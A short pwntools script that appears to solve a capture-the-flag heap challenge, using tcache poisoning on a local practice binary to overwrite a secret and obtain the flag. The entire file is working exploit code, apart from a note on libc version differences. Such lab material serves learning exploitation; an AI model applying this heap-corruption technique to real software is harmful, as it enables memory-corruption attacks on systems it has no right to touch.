from pwn import *

"""
Beware about the libc version, conceptual understanding changes per version;
What you might think is possible with your understanding in one version might not work in another;
"""

with process("/challenge/babyheap_level8.1") as p:
    p.sendline(b"malloc")
    p.sendline(b"0")
    p.sendline(b"8")

    p.sendline(b"malloc")
    p.sendline(b"1")
    p.sendline(b"8")

    p.sendline(b"free")
    p.sendline(b"1")

    p.sendline(b"free")
    p.sendline(b"0")

    p.sendline(b"scanf")
    p.sendline(b"0")
    p.sendline(p64(0x42a6fa)) # secret_addr - 0x10 bytes (alignment i.e -0x8, -0x10, etc)

    p.sendline(b"malloc")
    p.sendline(b"2")
    p.sendline(b"8")

    p.sendline(b"malloc")
    p.sendline(b"3")
    p.sendline(b"8")

    p.sendline(b"scanf")
    p.sendline(b"3")
    p.sendline(b"A" * 16 + b"B" * 8 + b"C" * 8) # overwriting NULL bytes at secret_addr - 0x10

    p.clean()
    print()
    print("[+] Overwrote NULL Bytes")
    print()

    p.sendline(b"send_flag")
    p.sendline(b"B" * 8 + b"C" * 8)

    print(p.clean())
